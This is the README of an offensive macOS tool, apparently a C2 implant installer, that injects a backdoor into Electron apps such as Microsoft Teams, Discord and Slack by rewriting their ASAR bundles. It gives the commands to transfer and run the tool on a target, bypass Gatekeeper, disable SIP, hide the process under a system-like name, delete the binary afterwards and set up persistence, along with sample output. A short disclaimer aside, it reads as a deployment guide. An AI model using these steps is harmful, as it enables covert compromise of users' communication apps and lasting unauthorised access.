# macOS Payload - Loki C2 Electron Injector

## 🎯 Quick Start

### Ready-to-Run Executable

```bash
# Make executable
chmod +x loki_injector_mac

# Run with sudo (requires admin)
sudo ./loki_injector_mac
```

## 📦 What's Included

```
loki_injector_mac       - Pre-built macOS executable (ARM64/Intel)
```

## 🚀 Usage

### On macOS Target:

1. **Transfer to target:**
   ```bash
   scp loki_injector_mac user@target:/tmp/
   ```

2. **Execute on target:**
   ```bash
   chmod +x /tmp/loki_injector_mac
   sudo /tmp/loki_injector_mac
   ```

3. **What it does:**
   - ✅ Scans for vulnerable Electron apps
   - ✅ Installs asar tool if needed
   - ✅ Creates backups automatically
   - ✅ Injects backdoor into ASAR files
   - ✅ Shows detailed progress

## 🎯 Targets (macOS)

Primary targets (auto-detected):
- **Microsoft Teams**
  - `/Applications/Microsoft Teams.app`
  - `~/Library/Application Support/Microsoft/Teams`
  
- **Discord**
  - `/Applications/Discord.app`
  - `~/Library/Application Support/Discord`
  
- **Slack**
  - `/Applications/Slack.app`
  - `~/Library/Application Support/Slack`

- **VS Code** (has integrity checks - harder)
- **Atom**
- **Signal Desktop**

## ⚙️ Architecture

The executable works on:
- ✅ Apple Silicon (M1/M2/M3)
- ✅ Intel Mac (x86_64)

## 📋 Requirements

### Target Requirements:
- macOS 10.15+
- Administrator/sudo access
- At least one target Electron app installed
- Node.js (or will auto-install asar via npm)

## 🛡️ Security Notice

**For authorized penetration testing only!**

- Only use on systems you own or have permission to test
- Malicious use is illegal
- This is a security research tool

## 📊 Expected Output

```bash
$ sudo ./loki_injector_mac

============================================================
Loki C2 - Electron Injector
============================================================

[*] Scanning for Electron applications...
[+] Found: Microsoft Teams
    Path: /Applications/Microsoft Teams.app/Contents/Resources/app.asar

[+] Found: Discord
    Path: /Applications/Discord.app/Contents/Resources/app.asar

[+] Found 2 target(s)

[*] Installing asar tool...
[+] asar tool installed

[*] Stopping Microsoft Teams...
[+] Microsoft Teams stopped

[*] Injecting into Microsoft Teams...
[+] Backup created: app.asar.backup
[+] Extracted ASAR
[+] Created preload.js
[+] Modified index.js
[+] Repacked ASAR
[+] Microsoft Teams injected successfully!

============================================================
INJECTION COMPLETE
============================================================
Successfully injected: 2
  - Microsoft Teams
  - Discord

[*] Restart the injected applications to activate backdoor
[*] Open DevTools (Cmd+Option+I) to see [Loki] messages
```

## 🔧 Troubleshooting

### "Permission denied"
```bash
# Fix permissions
chmod +x loki_injector_mac
sudo ./loki_injector_mac
```

### "Cannot be opened because it is from an unidentified developer"
```bash
# Bypass Gatekeeper (macOS security)
xattr -d com.apple.quarantine loki_injector_mac
sudo ./loki_injector_mac
```

### "No targets found"
- Install Microsoft Teams: https://www.microsoft.com/en-us/microsoft-teams/download-app
- Or install Discord: https://discord.com/download
- Or install Slack: https://slack.com/downloads/mac

### "asar tool installation failed"
```bash
# Install Node.js first
brew install node

# Or download from: https://nodejs.org/
```

### macOS Ventura/Sonoma Security
```bash
# Disable System Integrity Protection (SIP) if needed
# WARNING: Only on test/lab systems!
csrutil disable  # In Recovery Mode
```

## 🔐 macOS-Specific Considerations

### Gatekeeper
The executable is not code-signed, so macOS will block it by default:

```bash
# Remove quarantine attribute
xattr -d com.apple.quarantine loki_injector_mac

# Or allow in System Preferences
# System Preferences → Security & Privacy → Allow
```

### Full Disk Access
For some app directories, you may need to grant Full Disk Access:

1. System Preferences → Security & Privacy → Privacy
2. Full Disk Access
3. Add Terminal (or your shell)

### Notarization Bypass
For stealth operations, consider:
- Code signing with valid Apple Developer ID
- Notarizing the binary
- Using alternative delivery methods

## 📁 File Details

```bash
$ file loki_injector_mac
loki_injector_mac: Mach-O 64-bit executable arm64

$ ls -lh loki_injector_mac
-rwxr-xr-x  1 user  staff   4.2M Oct 20 06:35 loki_injector_mac
```

## 🧪 Testing

### Test in Safe Environment

```bash
# Create test VM with macOS
# Or use isolated macOS machine

# Install target app
brew install --cask microsoft-teams

# Run injector
sudo ./loki_injector_mac

# Verify injection
ls -la "/Applications/Microsoft Teams.app/Contents/Resources/"
# Should see: app.asar.backup

# Test backdoor
open "/Applications/Microsoft Teams.app"
# Press Cmd+Option+I for DevTools
# Look for [Loki] messages in console
```

## ⚡ Advanced Usage

### Stealth Execution
```bash
# Run in background
nohup sudo ./loki_injector_mac > /dev/null 2>&1 &

# Hide process
mv loki_injector_mac .system_update
sudo ./.system_update
```

### Auto-cleanup
```bash
# Remove after execution
sudo ./loki_injector_mac && rm -f loki_injector_mac
```

### Persistence
```bash
# Copy to system location (requires SIP disabled)
sudo cp loki_injector_mac /usr/local/bin/system_check
sudo chmod +x /usr/local/bin/system_check

# Create LaunchDaemon (auto-run on boot)
# Advanced - see macOS persistence techniques
```

## ✅ Next Steps

1. Transfer to macOS target machine
2. Make executable: `chmod +x loki_injector_mac`
3. Run with sudo: `sudo ./loki_injector_mac`
4. Verify injection successful
5. Restart target applications
6. Confirm backdoor active (check DevTools console)

---

**Ready to deploy?** Transfer and execute with sudo privileges!
